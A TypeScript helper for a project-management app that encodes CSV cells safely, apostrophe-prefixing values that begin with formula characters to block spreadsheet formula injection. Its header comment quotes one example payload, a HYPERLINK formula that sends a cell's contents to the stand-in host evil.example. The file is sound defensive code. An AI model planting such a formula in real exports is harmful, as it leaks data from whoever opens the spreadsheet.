// lib/csvSafe.ts
//
// projects-and-cost PM-10 — one CSV cell encoder every exporter can share.
//
// A spreadsheet evaluates a cell whose text begins with = + - @ (and, in
// some readers, a leading TAB or CR) as a formula — and quoting does NOT
// neutralise it: `"=1+1"` opens as 2. Every value a project export writes
// (project names, descriptions, MOC references, document titles, checkout
// purposes) is typed by some org member, so a name like
// `=HYPERLINK("https://evil.example/?d="&A2,"Open budget")` becomes a live
// formula in whoever opens the file.
//
// The guard: a value whose FIRST character is one of those six is prefixed
// with a single apostrophe (the spreadsheet convention for "this is text"),
// and the cell is then quoted, so the apostrophe travels as part of the
// text. Quote / comma / newline escaping is unchanged. The BOM and the .csv
// extension are unchanged (the PM-10 default).
//
// Consumers: lib/projectExport.ts (this package). lib/dataExport.ts,
// lib/exportTables.ts and lib/xlsxData.ts belong to other packages
// (document-control P10 / admin-and-org P2) — they adopt this helper there.

/** Characters that make a spreadsheet read a cell as a formula when they
 *  lead it. */
export const CSV_FORMULA_LEADERS: ReadonlySet<string> = new Set(["=", "+", "-", "@", "\t", "\r"]);

/** True when the text would be evaluated as a formula by a spreadsheet. */
export function isFormulaLike(s: string): boolean {
  return s.length > 0 && CSV_FORMULA_LEADERS.has(s[0]);
}

/**
 * Encode one value as a CSV cell. `null`/`undefined` → empty. A
 * formula-leading value is apostrophe-prefixed and quoted; a value holding
 * a quote, comma, CR or LF is quoted with its quotes doubled; anything else
 * is written bare.
 */
export function csvCell(v: unknown): string {
  if (v == null) return "";
  const raw = String(v);
  if (isFormulaLike(raw)) return `"'${raw.replace(/"/g, '""')}"`;
  if (/[",\n\r]/.test(raw)) return `"${raw.replace(/"/g, '""')}"`;
  return raw;
}

/** One CSV row from its cells. */
export function csvLine(fields: readonly unknown[]): string {
  return fields.map(csvCell).join(",");
}
